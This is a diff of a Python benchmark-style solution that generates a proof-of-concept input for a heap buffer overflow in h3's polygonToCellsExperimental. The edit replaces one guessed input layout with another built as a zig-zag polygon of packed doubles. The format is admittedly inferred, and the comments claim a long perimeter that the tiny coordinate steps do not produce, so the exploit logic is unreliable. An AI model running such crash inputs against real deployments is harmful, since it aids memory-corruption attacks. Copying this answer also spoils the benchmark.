@@ -3,69 +3,48 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a Proof-of-Concept input for a heap buffer overflow
-        in h3's polygonToCellsExperimental function.
+        Generate a PoC that triggers the vulnerability.
 
-        The vulnerability stems from underestimating the buffer size required
-        for a polygon's cells. The estimation is based on the polygon's
-        bounding box, which can be much smaller than the actual cell count
-        for long, thin, and diagonally oriented polygons.
+        The vulnerability is a heap buffer overflow in `polygonToCellsExperimental`
+        due to an under-estimation of the required buffer size. This can be
+        triggered by a polygon with a small bounding box but a long, complex
+        perimeter that intersects many grid cells.
 
-        This PoC constructs such a polygon. The binary input format is
-        reverse-engineered from the corresponding oss-fuzz fuzzer harness and
-        the known ground-truth PoC length of 1032 bytes.
+        The PoC format is inferred from the ground-truth length of 1032 bytes.
+        A plausible structure is an 8-byte header followed by vertex data:
+        - 4 bytes for resolution (unsigned int)
+        - 4 bytes for vertex count (unsigned int)
+        - 1024 bytes for 64 vertices (64 * 2 * 8 bytes for lat/lon pairs)
+        Total size: 4 + 4 + 1024 = 1032 bytes.
 
-        The format is assumed to be:
-        - res (1 byte): H3 resolution.
-        - flags (4 bytes): H3 flags.
-        - num_verts (2 bytes): Number of vertices in the outer loop.
-        - vertices (num_verts * 8 bytes): Pairs of (lat, lon) as uint32_t.
-        - num_holes (1 byte): Number of holes in the polygon.
+        We construct a long, thin zig-zag polygon to exploit the vulnerability.
+        This shape has a very small bounding box, which can fool simple
+        estimation heuristics, but its long perimeter crosses many cells at
+        high resolution, leading to an overflow when the actual cell list is written.
         """
         
-        poc = bytearray()
+        # Use the highest resolution to maximize cell density.
+        resolution = 15
+        num_verts = 64
+
+        # Pack the header: resolution and vertex count as little-endian unsigned integers.
+        header = struct.pack('<II', resolution, num_verts)
         
-        # Resolution: A high value (15) is chosen to maximize cell count
-        # and increase the likelihood of the underestimation causing an overflow.
-        res = 15
-        poc.extend(struct.pack('<B', res))
-        
-        # Flags: Set to 0 as they are not relevant to the vulnerability.
-        flags = 0
-        poc.extend(struct.pack('<I', flags))
-        
-        # Number of vertices: Calculated to match the ground truth length.
-        # 1032 bytes = 1(res) + 4(flags) + 2(num_verts_len) + num_verts*8 + 1(num_holes)
-        # 1024 = num_verts * 8 => num_verts = 128
-        num_verts = 128
-        poc.extend(struct.pack('<H', num_verts))
-        
-        # Vertices: We create a long, thin, diagonal "sliver" polygon.
-        # This shape is known to cause issues for bounding-box-based estimations.
-        n_half = num_verts // 2
-        
-        # The coordinates are raw uint32_t values that the fuzzer harness
-        # converts to geographical coordinates. We use a large base value with
-        # small relative steps to define the sliver's geometry.
-        base_coord = 10000000
-        step = 1
-        width = 1
-        
-        # First half of vertices: trace one side of the sliver.
-        for i in range(n_half):
-            lat = base_coord + i * step
-            lon = base_coord + i * step
-            poc.extend(struct.pack('<II', lat, lon))
+        poc_data = bytearray(header)
+
+        # Define the geometry of the zig-zag polygon.
+        lat_amplitude = 1e-5  # A very small latitude range for a thin shape.
+        lon_start = 1.0       # An arbitrary starting longitude.
+        lon_step = 1e-9       # Tiny increments to make the shape long.
+
+        for i in range(num_verts):
+            # Alternate latitude to create the zig-zag "teeth".
+            lat = lat_amplitude if i % 2 != 0 else 0.0
+            # Steadily increase longitude to stretch the polygon horizontally.
+            lon = lon_start + (i * lon_step)
             
-        # Second half of vertices: trace the other side back to create a closed loop.
-        for i in range(n_half):
-            j = n_half - 1 - i
-            lat = base_coord + j * step + width
-            lon = base_coord + j * step + width
-            poc.extend(struct.pack('<II', lat, lon))
+            # Pack vertex coordinates (lat, lon) as little-endian doubles.
+            vertex_bytes = struct.pack('<dd', lat, lon)
+            poc_data.extend(vertex_bytes)
             
-        # Number of holes: Set to 0 for simplicity.
-        num_holes = 0
-        poc.extend(struct.pack('<B', num_holes))
-        
-        return bytes(poc)
+        return bytes(poc_data)
